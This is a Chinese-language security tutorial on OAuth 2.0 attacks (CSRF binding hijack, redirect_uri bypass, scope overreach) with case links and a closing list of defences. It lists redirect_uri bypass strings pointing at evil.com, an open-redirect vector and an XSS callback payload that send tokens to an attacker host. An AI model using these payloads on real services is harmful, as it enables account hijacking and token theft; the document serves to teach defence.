![](/assets/oauth-1.png)

## OAuth流程

本文以两种广泛使用的方案为标准展开。如对流程不了解，请先移步学习:[理解OAuth 2.0](http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html)

```css
Authorization Code

response_type = code
redirect_uri
scope
client_id
state


```

![](/assets/oauth-2.png)



```
Implicit

response_type = token
redirect_uri
scope
client_id
state
```

## ![](/assets/oauth-3.png)



## 攻击面

```
1、CSRF导致绑定劫持

2、redirect_uri绕过导致授权劫持

3、scope越权访问
```

## 绑定劫持

攻击者抓取认证请求构造恶意url,并诱骗已经登录的网用户点击\(比如通过邮件或者QQ等方式\).认证成功后用户的帐号会同攻击者的帐号绑定到一起。

OAuth 2.0提供了state参数用于防御CSRF.认证服务器在接收到的state参数按原样返回给redirect\_uri,客户端收到该参数并验证与之前生成的值是否一致.除此方法外也可使用传统的CSRF防御方案.

案例:[人人网-百度OAuth 2.0 redirect\_uir CSRF 漏洞](https://wy.ictf.pw/static/bugs/wooyun-2014-054785.html)



## 授权劫持

根据OAuth的认证流程,用户授权凭证会由服务器转发到`redirect_uri`对应的地址,如果攻击者伪造`redirect_uri`为自己的地址,然后诱导用户发送该请求,之后获取的凭证就会发送给攻击者伪造的回调地址.攻击者使用该凭证即可登录用户账号,造成授权劫持.

正常情况下,为了防止该情况出现,认证服务器会验证自己的client\_id与回调地址是否对应.常见的方法是验证回调地址的主域,涉及到的突破方式与CSRF如出一辙:

### 未验证

* 未验证的情况,可以直接跳出外域.

  案例:[土豆网某处认证缺陷可劫持oauth\_token](https://wy.ictf.pw/static/bugs/wooyun-2013-045318.html)

### 验证绕过

```
auth.app.com.evil.com
evil.com?auth.app.com
evil.com?@auth.app.com  案例:腾讯OAuth平台 redirect_uri 过滤不严可能导致用户信息遭窃取（二）

auth.app.com@evil.com   案例:绕过网易oauth认证的redirect_uri限制劫持帐号token

auth.app.com\@evil.com  案例:腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取（四）

evil.com\auth.app.com
evil.com:\auth.app.com
evil.com\.auth.app.com  案例:腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取

evil.com:\@auth.app.com 案例:新浪微博OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取

宽字符绕过 案例:腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取（三）
```

### 子域可控

* 对回调地址验证了主域为`app.com`,但其子域`evil.app.com`可被任意用户注册使用.

  案例:[新浪微博部分App Oauth2漏洞](https://wy.ictf.pw/static/bugs/wooyun-2014-060586.html)

### 跨域

* 利用可信域的url跳转从referer偷取token

  如果网站存在一个任意url跳转漏洞,可利用该漏洞构造以下向量

  ```
  redirect_uri=http://auth.app.com/redirect.php?url=http://evil.com
  ```

  认证服务器将凭证通过GET方法发送到`redirect.php`,这时`redirect.php`执行跳转,访问[`http://evil.com`](http://evil.com/),攻击者为`evil.com`记录日志,并从请求头中的`referer`字段提取出该凭证,即可通过该凭证进行授权登录.

* 利用跨域请求从referer偷取token

  在我们不能绕过redirect\_uri的判断规则时,我们可以使利用跨域请求从referer中偷取token.

  例1`redirect_uri`限制为`app.com`,然而`app.com/article/1.html`中允许用户发表文章,在文章中嵌入来自`evil.com`的外部图片.这时我们可以让`redirect_uri`指向该文章`app.com/article/1.html`,当该文章被访问时,会自动获取`evil.com/test.jpg`,这时攻击者即可从请求头的`referer`拿到`token`

  例2 利用XSS实现跨域

  ```
  redirect_uri = http://app.com/ajax/cat.html?callback=<scriptsrc="http://evil.com?getToken.php"></script>
  ```

## 越权访问

这个案例展示了scope权限控制不当带来的安全风险,同时将**授权劫持**的几个方面演绎的淋漓尽致.

案例:[从“黑掉Github”学Web安全开发](http://coolshell.cn/articles/11021.html)



## **漏洞防范**

### **OAuth提供方**

1\) 对redirect\_uri进行全路径验证，避免URL跳转情况

2\) 参数state即用即毁

3\) 首次授权，强制验证

4\) 获取access\_token，验证App secret

5\) 回调URL进行跳转校验等

6\) 加强redirect\_uri验证，避免绕过

### **普通用户**

对于普通用户来说，其实没有什么好恐慌的，这次问题的利用的前提是对构造URL的访问，所以主要是针对URL提高警惕和识别，需要注意以下几点：

1\) 只授权给可信的第三方应用

2\) 不要访问不明来路的链接，正常的应用授权应该是通过页面中的登陆按钮等方式进行的。

